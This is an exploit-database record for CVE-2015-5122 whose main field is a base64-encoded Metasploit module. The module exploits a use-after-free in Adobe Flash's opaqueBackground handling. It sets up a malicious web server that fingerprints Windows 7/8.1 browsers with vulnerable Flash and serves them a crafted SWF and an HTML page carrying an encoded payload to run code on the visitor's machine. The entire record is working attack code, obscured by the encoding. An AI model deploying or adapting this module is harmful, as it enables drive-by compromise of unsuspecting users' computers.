{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gTm9ybWFsUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkJyb3dzZXJFeHBsb2l0U2VydmVyDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICAgICAgID0+ICdBZG9iZSBGbGFzaCBvcGFxdWVCYWNrZ3JvdW5kIFVzZSBBZnRlciBGcmVlJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgICAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYW4gdXNlIGFmdGVyIGZyZWUgb24gQWRvYmUgRmxhc2ggUGxheWVyLiBUaGUgdnVsbmVyYWJpbGl0eSwNCiAgICAgICAgZGlzY292ZXJlZCBieSBIYWNraW5nIFRlYW0gYW5kIG1hZGUgcHVibGljIG9uIGl0cyBKdWx5IDIwMTUgZGF0YSBsZWFrLCB3YXMNCiAgICAgICAgZGVzY3JpYmVkIGFzIGFuIFVzZSBBZnRlciBGcmVlIHdoaWxlIGhhbmRsaW5nIHRoZSBvcGFxdWVCYWNrZ3JvdW5kIHByb3BlcnR5DQogICAgICAgIDcgc2V0dGVyIG9mIHRoZSBmbGFzaC5kaXNwbGF5LkRpc3BsYXlPYmplY3QgY2xhc3MuIFRoaXMgbW9kdWxlIGlzIGFuIGVhcmx5IHJlbGVhc2UNCiAgICAgICAgdGVzdGVkIG9uOg0KDQogICAgICAgIFdpbmRvd3MgNyBTUDEgKDMyLWJpdCksIElFMTEgYW5kIEFkb2JlIEZsYXNoIDE4LjAuMC4yMDMsDQogICAgICAgIFdpbmRvd3MgNyBTUDEgKDMyLWJpdCksIEZpcmVmb3ggMzguMC41IGFuZCBBZG9iZSBGbGFzaCAxOC4wLjAuMTk0LA0KICAgICAgICBXaW5kb3dzIDcgU1AxICgzMi1iaXQpLCBJRTkgYW5kIEFkb2JlIEZsYXNoIEZsYXNoIDE4LjAuMC4yMDMsDQogICAgICAgIFdpbmRvd3MgNyBTUDEgKDMyLWJpdCksIEZpcmVmb3ggKyBBZG9iZSBGbGFzaCAxOC4wLjAuMTk0LA0KICAgICAgICB3aW5kb3dzIDguMSwgRmlyZWZveCBhbmQgQWRvYmUgRmxhc2ggMTguMC4wLjIwMywNCiAgICAgICAgV2luZG93cyA4LjEsIEZpcmVmb3ggYW5kIEFkb2JlIEZsYXNoIDE4LjAuMC4xNjAsIGFuZA0KICAgICAgICBXaW5kb3dzIDguMSwgRmlyZWZveCBhbmQgQWRvYmUgRmxhc2ggMTguMC4wLjE5NA0KICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdBdXRob3InICAgICAgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ1Vua25vd24nLCAgICAgICMgVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcmVkIG9uIEhhY2tpbmdUZWFtIGluZm8gbGVhaw0KICAgICAgICAgICdqdWFuIHZhenF1ZXonLCAjIFBvcnRlZCB0byBNc2YNCiAgICAgICAgICAnc2lubjNyJyAgICAgICAgIyBUZXN0aW5nIGFuZCBzb21lIGVkaXRpbmcNCiAgICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydDVkUnLCAnMjAxNS01MTIyJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly93d3cuZmlyZWV5ZS5jb20vYmxvZy90aHJlYXQtcmVzZWFyY2gvMjAxNS8wNy9jdmUtMjAxNS01MTIyXy1fc2Vjby5odG1sJ10NCiAgICAgICAgXSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgICAgICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ0Rpc2FibGVOb3BzJyA9PiB0cnVlDQogICAgICAgIH0sDQogICAgICAnUGxhdGZvcm0nICAgICAgICAgICAgPT4gWyd3aW4nXSwNCiAgICAgICdBcmNoJyAgICAgICAgICAgICAgICA9PiBbQVJDSF9YODZdLA0KICAgICAgJ0Jyb3dzZXJSZXF1aXJlbWVudHMnID0+DQogICAgICAgIHsNCiAgICAgICAgICA6c291cmNlICA9PiAvc2NyaXB0fGhlYWRlcnMvaSwNCiAgICAgICAgICA6YXJjaCAgICA9PiBBUkNIX1g4NiwNCiAgICAgICAgICA6b3NfbmFtZSA9PiBsYW1iZGEgZG8gfG9zfA0KICAgICAgICAgICAgb3MgPX4gT3BlcmF0aW5nU3lzdGVtczo6TWF0Y2g6OldJTkRPV1NfNyB8fA0KICAgICAgICAgICAgb3MgPX4gT3BlcmF0aW5nU3lzdGVtczo6TWF0Y2g6OldJTkRPV1NfODENCiAgICAgICAgICBlbmQsDQogICAgICAgICAgOnVhX25hbWUgPT4gbGFtYmRhIGRvIHx1YXwNCiAgICAgICAgICAgIGNhc2UgdGFyZ2V0Lm5hbWUNCiAgICAgICAgICAgIHdoZW4gJ1dpbmRvd3MnDQogICAgICAgICAgICAgIHJldHVybiB0cnVlIGlmIHVhID09IE1zZjo6SHR0cENsaWVudHM6OklFIHx8IHVhID09IE1zZjo6SHR0cENsaWVudHM6OkZGDQogICAgICAgICAgICBlbmQNCg0KICAgICAgICAgICAgZmFsc2UNCiAgICAgICAgICBlbmQsDQogICAgICAgICAgOmZsYXNoICAgPT4gbGFtYmRhIGRvIHx2ZXJ8DQogICAgICAgICAgICBjYXNlIHRhcmdldC5uYW1lDQogICAgICAgICAgICB3aGVuICdXaW5kb3dzJw0KICAgICAgICAgICAgICByZXR1cm4gdHJ1ZSBpZiB2ZXIgPX4gL14xOFwuLyAmJiBHZW06OlZlcnNpb24ubmV3KHZlcikgPD0gR2VtOjpWZXJzaW9uLm5ldygnMTguMC4wLjIwMycpDQogICAgICAgICAgICBlbmQNCg0KICAgICAgICAgICAgZmFsc2UNCiAgICAgICAgICBlbmQNCiAgICAgICAgfSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnV2luZG93cycsDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICdQbGF0Zm9ybScgPT4gJ3dpbicNCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgICAgICAgPT4gZmFsc2UsDQogICAgICAnRGlzY2xvc3VyZURhdGUnICAgICAgPT4gJ0p1bCAwNiAyMDE1JywNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgICAgICA9PiAwKSkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBAc3dmID0gY3JlYXRlX3N3Zg0KDQogICAgc3VwZXINCiAgZW5kDQoNCiAgZGVmIG9uX3JlcXVlc3RfZXhwbG9pdChjbGksIHJlcXVlc3QsIHRhcmdldF9pbmZvKQ0KICAgIHByaW50X3N0YXR1cygiUmVxdWVzdDogI3tyZXF1ZXN0LnVyaX0iKQ0KDQogICAgaWYgdGFyZ2V0X2luZm9bOm9zX25hbWVdID1+IE9wZXJhdGluZ1N5c3RlbXM6Ok1hdGNoOjpXSU5ET1dTXzgxICYmIHRhcmdldF9pbmZvWzp1YV92ZXJdID09ICcxMS4wJw0KICAgICAgcHJpbnRfd2FybmluZygiVGFyZ2V0IHNldHVwIG5vdCBzdXBwb3J0ZWQiKQ0KICAgICAgc2VuZF9ub3RfZm91bmQoY2xpKQ0KICAgICAgcmV0dXJuDQogICAgZW5kDQoNCiAgICBpZiByZXF1ZXN0LnVyaSA9fiAvXC5zd2YkLw0KICAgICAgcHJpbnRfc3RhdHVzKCdTZW5kaW5nIFNXRi4uLicpDQogICAgICBzZW5kX3Jlc3BvbnNlKGNsaSwgQHN3ZiwgeydDb250ZW50LVR5cGUnPT4nYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2gnLCAnQ2FjaGUtQ29udHJvbCcgPT4gJ25vLWNhY2hlLCBuby1zdG9yZScsICdQcmFnbWEnID0+ICduby1jYWNoZSd9KQ0KICAgICAgcmV0dXJuDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoJ1NlbmRpbmcgSFRNTC4uLicpDQogICAgc2VuZF9leHBsb2l0X2h0bWwoY2xpLCBleHBsb2l0X3RlbXBsYXRlKGNsaSwgdGFyZ2V0X2luZm8pLCB7J1ByYWdtYScgPT4gJ25vLWNhY2hlJ30pDQogIGVuZA0KDQogIGRlZiBleHBsb2l0X3RlbXBsYXRlKGNsaSwgdGFyZ2V0X2luZm8pDQogICAgc3dmX3JhbmRvbSA9ICIje3JhbmRfdGV4dF9hbHBoYSg0ICsgcmFuZCgzKSl9LnN3ZiINCiAgICB0YXJnZXRfcGF5bG9hZCA9IGdldF9wYXlsb2FkKGNsaSwgdGFyZ2V0X2luZm8pDQogICAgYjY0X3BheWxvYWQgPSBSZXg6OlRleHQuZW5jb2RlX2Jhc2U2NCh0YXJnZXRfcGF5bG9hZCkNCiAgICBvc19uYW1lID0gdGFyZ2V0X2luZm9bOm9zX25hbWVdDQoNCiAgICBpZiB0YXJnZXQubmFtZSA9fiAvV2luZG93cy8NCiAgICAgIHBsYXRmb3JtX2lkID0gJ3dpbicNCiAgICBlbmQNCg0KICAgIGh0bWxfdGVtcGxhdGUgPSAlUXw8aHRtbD4NCiAgICA8Ym9keT4NCiAgICA8b2JqZWN0IGNsYXNzaWQ9ImNsc2lkOmQyN2NkYjZlLWFlNmQtMTFjZi05NmI4LTQ0NDU1MzU0MDAwMCIgY29kZWJhc2U9Imh0dHA6Ly9kb3dubG9hZC5tYWNyb21lZGlhLmNvbS9wdWIvc2hvY2t3YXZlL2NhYnMvZmxhc2gvc3dmbGFzaC5jYWIiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIC8+DQogICAgPHBhcmFtIG5hbWU9Im1vdmllIiB2YWx1ZT0iPCU9c3dmX3JhbmRvbSU+IiAvPg0KICAgIDxwYXJhbSBuYW1lPSJhbGxvd1NjcmlwdEFjY2VzcyIgdmFsdWU9ImFsd2F5cyIgLz4NCiAgICA8cGFyYW0gbmFtZT0iRmxhc2hWYXJzIiB2YWx1ZT0ic2g9PCU9YjY0X3BheWxvYWQlPiZwbD08JT1wbGF0Zm9ybV9pZCU+Jm9zPTwlPW9zX25hbWUlPiIgLz4NCiAgICA8cGFyYW0gbmFtZT0iUGxheSIgdmFsdWU9InRydWUiIC8+DQogICAgPGVtYmVkIHR5cGU9ImFwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIiBzcmM9IjwlPXN3Zl9yYW5kb20lPiIgYWxsb3dTY3JpcHRBY2Nlc3M9ImFsd2F5cyIgRmxhc2hWYXJzPSJzaD08JT1iNjRfcGF5bG9hZCU+JnBsPTwlPXBsYXRmb3JtX2lkJT4mb3M9PCU9b3NfbmFtZSU+IiBQbGF5PSJ0cnVlIi8+DQogICAgPC9vYmplY3Q+DQogICAgPC9ib2R5Pg0KICAgIDwvaHRtbD4NCiAgICB8DQoNCiAgICByZXR1cm4gaHRtbF90ZW1wbGF0ZSwgYmluZGluZygpDQogIGVuZA0KDQogIGRlZiBjcmVhdGVfc3dmDQogICAgcGF0aCA9IDo6RmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTUtNTEyMicsICdtc2Yuc3dmJykNCiAgICBzd2YgPSAgOjpGaWxlLm9wZW4ocGF0aCwgJ3JiJykgeyB8Znwgc3dmID0gZi5yZWFkIH0NCg0KICAgIHN3Zg0KICBlbmQNCmVuZA==", 
    "filename": "platforms/windows/remote/37599.rb", 
    "id": "37599", 
    "cves": [
        "CVE-2015-5122"
    ]
}